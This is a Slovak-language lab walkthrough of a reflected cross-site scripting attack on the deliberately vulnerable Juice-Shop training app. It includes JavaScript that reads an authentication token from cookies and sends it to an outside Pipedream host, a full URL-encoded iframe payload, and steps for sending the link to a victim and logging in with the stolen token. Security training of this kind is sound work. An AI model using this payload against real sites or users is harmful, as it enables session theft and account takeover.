# Reflected cross site scripting (XSS)

### Prostredie: Juice-Shop - https://github.com/juice-shop/juice-shop#from-sources

- Reflektovaný XSS využíva odosielanie neovereného vstupu pomocou HTTP požiadavky. V rámci jednej požiadavky sa následne vracia neoverený vstup a vkladá sa priamo do tela stránky, čím vzniká zraniteľnosť.  
- Po spustení aplikácie a zaregistrovaní sa prejdeme do sekcii v menu "Objednávky a platby".
- V url sa nám zobrazujú objednávky podľa parametru id. V detaile objednávky vidíme informácie o stave a id objednávky vložené z url parametru.
- Takáto konštrukcia má potencionálnu zraniteľnosť a to, že vpisujeme neoverený vstup priamo do DOM stránky.
- V zdrojovom kóde juice-shopu v komponente track-result.component.html (angular komponent) je hodnota id vkladaná do DOM cez zraniteľnú metódu "innerHTML". To nám v prípade neoverenia vstupu umožňuje aplikovať reflektovaný XSS útok.
- Do url parametru môžeme vložiť škodlivý kód, ktorý bude priamo vložený do tela stránky.
  ```
          const headers = new Headers();
          headers.append("Content-Type", "text/plain");

          const body = {
          test: "event",
          };

          const options = {
          method: "POST",
          headers,
          mode: "cors",
          body: document.cookie.split("")[4].split("=")[1],
          };

        // Doplnit endpoint vygenerovany sluzbou Pipedream
        fetch("pipedream-endpoint", options); 
- Kód vytvorí HTTP požiadavku na daný endpoint a odošle autentifikačný token z cookie súborov. 
- V kóde sa nachádza komentár nad funkciou fetch(). Pomocou služby Pipedream musíme vygenerovať nový endpoint a jeho url adresu vložiť do funkcie. Na adrese https://pipedream.com/ si vytvoríme
    nový projekt. Po vytvorení projektu vygenerujeme endpoint a v sekcii "trigger" skopírujeme url adresu a vložíme do nášho kódu.
- Kód musíme vložiť do atribútu "src" značky "iframe" aby ho stránka vedeľa vyhodnotiť.

   ```
   <iframe src="javascript:......" />
  ```
- Kód ešte potrebujeme zakódovať tak, aby ho prehliadač vedel prijať ako validný parameter (online enkóder a dekóder - https://www.urlencoder.org/). Zakodovanú url vložíme do parametru id a spustíme. Celá url môže vyzerať nasledovne:

         http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript%3Aconst%20headers%20%3D%20new%20Headers
              ()%3Bheaders.append(%60Content-Type%60%2C%20%60text%2Fplain%60)%3Bconst%20body%20%3D%20%7Btest%3A%20%60event%60
              %2C%7D%3Bconst%20options%20%3D%20%7Bmethod%3A%20%60POST%60%2Cheaders%2Cmode%3A%20%60cors%60%2Cbody%3A%20document
              .cookie.split(%60%20%60)%5B4%5D.split(%60%3D%60)%5B1%5D%7D%3Bfetch(%60https%3A%2F%2Feojph9o2kgja7k2.m.pipedream.
              net%60%2C%20options)%3B%22%3E%3C%2Fiframe%3E">
              http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript%3Aconst%20headers%20%3D%20new%20Headers
              ()%3Bheaders.append(%60Content-Type%60%2C%20%60text%2Fplain%60)%3Bconst%20body%20%3D%20%7Btest%3A%20%60event%60
              %2C%7D%3Bconst%20options%20%3D%20%7Bmethod%3A%20%60POST%60%2Cheaders%2Cmode%3A%20%60cors%60%2Cbody%3A%20document
              .cookie.split(%60%20%60)%5B4%5D.split(%60%3D%60)%5B1%5D%7D%3Bfetch(%60https%3A%2F%2Feojph9o2kgja7k2.m.pipedream.
              net%60%2C%20options)%3B%22%3E%3C%2Fiframe%3E"

- Skopírovanú url môžeme poslať používateľovi a v prípade, že je používateľ prihláseny v systéme, odošle na náš endpoint jeho autentifikačný token.
- Získaný token vložíme do lokálneho úložiska aplikácie a týmto spôsobom sa prihlásme do účtu používateľa.

- Video návod sa nachádza v priečinku "video_instructions": /video_instructions/reflected-xss.mp4 (https://github.com/MatusVetrik/dp-attacks-instructions/blob/main/video_instructions/reflected-xss.mp4)
